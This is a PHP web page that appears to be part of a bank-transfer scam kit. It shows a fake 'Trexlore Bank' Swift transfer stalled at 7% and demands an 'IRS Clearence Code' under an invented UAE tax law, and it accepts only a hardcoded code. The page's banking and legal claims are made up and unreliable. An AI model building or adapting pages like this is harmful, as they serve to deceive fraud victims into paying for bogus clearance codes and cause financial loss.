<?php
if(isset($_POST['sub'])){
$name = $_POST['code'];
$pass = $_POST['static'];

if($name === '76562' AND $pass === 'playme'){
header("Location:transfer_tax_confirm.php");
}else
    {
        header("Location:transfer_invalid.php");
   exit;
    }
}
?><!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta content="initial-scale=1, maximum-scale=1, width=device-width" name="viewport">
    <link href="../stylesheets/application.css?1325743336" media="screen" rel="stylesheet" type="text/css" />
    <link href="../stylesheets/ui-progress-bar.css?1325742643" media="screen" rel="stylesheet" type="text/css" />
    <script src="../javascripts/application.js?1325742642" type="text/javascript"></script>
        <link href="../stylesheets/application.css?1325743336" media="screen" rel="stylesheet" type="text/css" />
    <link href="../stylesheets/ui-progress-bar.css?1325742643" media="screen" rel="stylesheet" type="text/css" />
    <style type="text/css">
    .index #container #stage .intro article {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
}
    .index table tr td {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 12px;
}
    .index #container #stage .intro #sub table tr td strong {
	font-weight: bold;
}
.btn {
  background: #3498db;
  background-image: -webkit-linear-gradient(top, #3498db, #2980b9);
  background-image: -moz-linear-gradient(top, #3498db, #2980b9);
  background-image: -ms-linear-gradient(top, #3498db, #2980b9);
  background-image: -o-linear-gradient(top, #3498db, #2980b9);
  background-image: linear-gradient(to bottom, #3498db, #2980b9);
  -webkit-border-radius: 14;
  -moz-border-radius: 14;
  border-radius: 14px;
  font-family: Arial;
  color: #ffffff;
  font-size: 20px;
  padding: 10px 40px 10px 40px;
  text-decoration: none;
}

.btn:hover {
  background: #3cb0fd;
  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
  text-decoration: none;
}

.btnt {
  background: #d93455;
  background-image: -webkit-linear-gradient(top, #d93455, #c20808);
  background-image: -moz-linear-gradient(top, #d93455, #c20808);
  background-image: -ms-linear-gradient(top, #d93455, #c20808);
  background-image: -o-linear-gradient(top, #d93455, #c20808);
  background-image: linear-gradient(to bottom, #d93455, #c20808);
  -webkit-border-radius: 14;
  -moz-border-radius: 14;
  border-radius: 14px;
  font-family: Arial;
  color: #ffffff;
  font-size: 20px;
  padding: 10px 40px 10px 40px;
  text-decoration: none;
}

.btnt:hover {
  background: #420e1d;
  background-image: -webkit-linear-gradient(top, #420e1d, #ff0d0d);
  background-image: -moz-linear-gradient(top, #420e1d, #ff0d0d);
  background-image: -ms-linear-gradient(top, #420e1d, #ff0d0d);
  background-image: -o-linear-gradient(top, #420e1d, #ff0d0d);
  background-image: linear-gradient(to bottom, #420e1d, #ff0d0d);
  text-decoration: none;
}
    </style>
    <link href="../SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
  <script src="../SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>

  </head>
  <body class="index">
    <div id="container">
      <header>
      </header>
      <div id="stage">
        <section class="work">
          <h3> Your transfer request is currently being processed, thanks for your patience</h3>
          <div class="ui-progress-bar ui-container" id="progress_bar">
            <div class="ui-progress" style="width: 7%;">
              <span class="ui-label" style="display:none;">
                Initiating Interbank Swift Transfer
                <b class="value">7%</b>
              </span>
            </div>
          </div>
        </section>
        <section class="intro" style="display: none;">
          <article>
            <h2>ERROR CODE 465: Swift Transfer Interrupted / Terminated.</h2>
            <p>
              The transfer has been suspended, Please provide your IRS Clearence Code, this is in accordance with the United Arab Emirates tax law 2015 which came into effect on the 1st of July 2014.
            </p>
            <p>
              Please if you have any problem, do not hesitate to contact your account officer.
            </p>
            <p>
              <i>Trexlore Bank Internet Banking service.</i>
            </p>
            <p>
          <form action="" method="post" enctype="application/x-www-form-urlencoded" name="sub" id="sub"><table width="70%" border="0">
  <tr>
    <td><strong>IRS Clearence Code</strong></td>
    <td><span id="codetx"><input name="code" type="text" id="code" size="30"><span class="textfieldRequiredMsg">IRS Clearence Code.</span><span class="textfieldInvalidFormatMsg">Invalid format.</span><span class="textfieldMaxValueMsg">The entered value is greater than the maximum allowed.</span><span class="textfieldMinValueMsg">The entered value is less than the minimum required.</span><span class="textfieldMinCharsMsg">Minimum number of characters not met.</span><span class="textfieldMaxCharsMsg">Exceeded maximum number of characters.<span></span></span></span></td>
    <td>&nbsp;</td>
  </tr>
</table>

            </p>
          </article>
          <div class="download">
            <ol class="links"><table width="41%" border="0">
  <tr>
    <td><input type="submit" name="sub" id="sub" value="Complete Transfer" class="btn"></td>
    <td><input type="submit" name="sub" id="sub" value="Cancel Transaction" class="btnt"></td>
  </tr>
</table>
            </ol>
            <ol class="links">
            </ol>
          </div><input name="static" type="hidden" id="static" value="playme"></form>
        </section>
        <!--<section class="compatibility" style="display: none;">
          <h2>Compatibility</h2>
          <ol class="browsers">
            <li class="browser" id="chrome">
              <p>Google Chrome 12+</p>
            </li>
            <li class="browser" id="firefox">
              <p>Firefox 5+</p>
            </li>
            <li class="browser" id="safari">
              <p>Safari 5+</p>
            </li>
            <li class="browser" id="opera">
              <p>Opera 11+</p>
            </li>
            <li class="browser" id="ie">
              <p>Internet Explorer 9+</p>
            </li>
          </ol>
          <article>
            <p>
              This progress bar will work in the latest version of all major browsers to provide full compatibility with animation, gradients, and shadows, and degrade gracefully in older versions, however
              <abbr title="Your Mileage May Vary">YMMV</abbr>
            </p>
          </article>
        </section>-->
        <!--<section class="wild" style="display: none;">
          <h2>
            In the wild
            <span>Who's using it?</span>
          </h2>
          <ol class="users">
            <li class="user" id="sparrow">
              <a rel="nofollow" href="http://sprw.me/comingsoon/">Sparrow for iPhone</a>
            </li>
            <li class="user" id="test_pilot">
              <a href="http://testpilot.me">TestPilot CI</a>
            </li>
            <li class="user" id="add">
              <a rel="twipsy" title="I'm using this!" href="https://github.com/ivanvanderbyl/ui-progress-bar/issues/new?title=[INSERT+PROJECT]+is+using+this">I'm using it!</a>
            </li>
          </ol>
        </section>-->
      </div>
      <script>
        //<![CDATA[
          $(function() {
            App.init();  
          });
        //]]>
      </script>
      
  </div>
  </body>
</html>
